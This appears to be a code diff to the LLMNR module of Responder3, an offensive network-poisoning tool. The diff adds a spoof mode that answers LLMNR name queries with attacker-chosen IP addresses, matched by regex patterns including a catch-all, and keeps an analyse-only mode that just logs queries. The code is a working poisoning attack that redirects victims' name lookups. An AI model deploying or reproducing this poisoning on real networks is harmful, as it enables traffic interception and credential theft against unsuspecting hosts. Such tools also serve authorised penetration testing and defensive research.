@@ -1,4 +1,6 @@
 import io
+import os
+import re
 import logging
 import traceback
 import socket
@@ -9,7 +11,11 @@ import ipaddress
 
 from responder3.newpackets.LLMNR import * 
 from responder3.newpackets.DNS import * 
-from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP
+from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP, ProtocolSession, PoisonerMode
+
+class LLMNRSession(ProtocolSession):
+	def __init__(self, server):
+		ProtocolSession.__init__(self, server)
 
 class LLMNR(ResponderServer):
 	def __init__(self):
@@ -17,6 +23,28 @@ class LLMNR(ResponderServer):
 
 	def modulename(self):
 		return 'LLMNR'
+
+	def setup(self):
+		self.protocol = LLMNRProtocol
+		self.spoofTable = []
+		if self.settings is None:
+			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
+			self.settings = {}
+			self.settings['mode'] = PoisonerMode.ANALYSE
+
+		else:
+			#parse the poisoner mode
+			if isinstance(self.settings['mode'], str):
+				self.settings['mode'] = PoisonerMode[self.settings['mode'].upper()]
+
+			#compiling re strings to actual re objects and converting IP strings to IP objects
+			if self.settings['mode'] == PoisonerMode.SPOOF:
+				for exp in self.settings['spoofTable']:
+					if exp == 'ALL':
+						self.spoofTable.append((re.compile('.*'),ipaddress.ip_address(self.settings['spoofTable'][exp])))
+						continue
+					self.spoofTable.append((re.compile(exp),ipaddress.ip_address(self.settings['spoofTable'][exp])))
+
 
 	def run(self):
 		#need to do some wizardy with the socket setting here
@@ -34,13 +62,39 @@ class LLMNR(ResponderServer):
 
 		return self.loop.run_until_complete(coro)
 
-	def handle(self, packet, addr, transport):
+	def handle(self, packet, addr, transport, session):
+		if 'R3DEEPDEBUG' in os.environ:
+				self.log(logging.INFO,'Packet: %s' % (repr(packet),), session)
 		try:
-			#self.log(logging.DEBUG,'Handle called with data: ' + data.hex())
-			print(repr(packet))
-			pp = self.poison(packet, ipaddress.ip_address('192.168.11.11'))
-			transport.sendto(pp.toBytes(), addr)
-			self.log(logging.DEBUG,'Sending response!')
+			if self.settings['mode'] == PoisonerMode.ANALYSE:
+				for q in packet.Questions:
+					self.logPoisonResult(session, requestName = q.QNAME)
+
+			else:
+				answers = []
+				for targetRE, ip in self.spoofTable:
+					for q in packet.Questions:
+						if targetRE.match(q.QNAME.name):
+							self.logPoisonResult(session, requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
+							res = DNSResource()
+							if ip.version == 4:
+								#BE AWARE THIS IS NOT CHECKING IF THE QUESTION AS FOR IPV4 OR IPV6!!!
+								res.construct(q.QNAME.name, DNSType.A, ip)
+							elif ip.version == 6:
+								res.construct(q.QNAME.name, DNSType.AAAA, ip) #not tested, but should work
+							else:
+								raise Exception('This IP version scares me...')
+							#res.construct(q.QNAME, NBRType.NB, ip)
+							answers.append(res)
+				
+				response = LLMNRPacket()
+				response.construct(  TID = packet.TransactionID, 
+									 response = LLMNRResponse.RESPONSE, 
+									 answers = answers,
+									 questions = packet.Questions
+								  )
+
+				transport.sendto(response.toBytes(), addr)
 			
 
 		except Exception as e:
@@ -68,8 +122,9 @@ class LLMNRProtocol(ResponderProtocolUDP):
 	
 	def __init__(self, server):
 		ResponderProtocolUDP.__init__(self, server)
+		self._session = LLMNRSession(server.rdnsd)
 
 	def _parsebuff(self, addr):
-		print(self._buffer)
-		packet = LLMNRPacket(io.BytesIO(self._buffer))
-		self._server.handle(packet, addr, self._transport)
+		packet = LLMNRPacket.from_bytes(self._buffer)
+		self._server.handle(packet, addr, self._transport, self._session)
+		self._buffer = b''
